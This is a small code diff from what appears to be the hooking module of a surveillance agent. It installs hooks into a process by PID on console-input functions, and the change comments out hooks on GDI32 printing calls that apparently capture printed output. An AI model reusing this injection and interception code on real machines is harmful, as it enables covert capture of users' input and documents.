@@ -956,7 +956,7 @@ void __stdcall HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOO
 	HMMAKE_HOOK(dwPid, "ReadConsoleInputExA", PM_ReadConsoleInputEx, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
 	HMMAKE_HOOK(dwPid, "ReadConsoleInputExW", PM_ReadConsoleInputEx, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
 
-	// --- PM per il print agent...
+/*	// --- PM per il print agent...
 	// Le altre funzioni utilizzeranno PARAM[0] per accedere ai dati memorizzati nella
 	// DataStruct di CreateDC (es: handle al memory device)
 	pServiceData->PARAM[0] = HMMAKE_HOOK(dwPid, "CreateDCW", CreateDC_wrap, CreateDC_data, CreateDC_setup, pServiceData, "GDI32.dll");
@@ -975,6 +975,7 @@ void __stdcall HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOO
 		HMMAKE_HOOK(dwPid, "SetAbortProc", SetAbortProc_wrap, SetAbortProc_data, SetAbortProc_setup, pServiceData, "GDI32.dll");
 		HMMAKE_HOOK(dwPid, "GetDeviceCaps", GetDeviceCaps_wrap, GetDeviceCaps_data, GetDeviceCaps_setup, pServiceData, "GDI32.dll");
 	}
+*/
 }
 
 
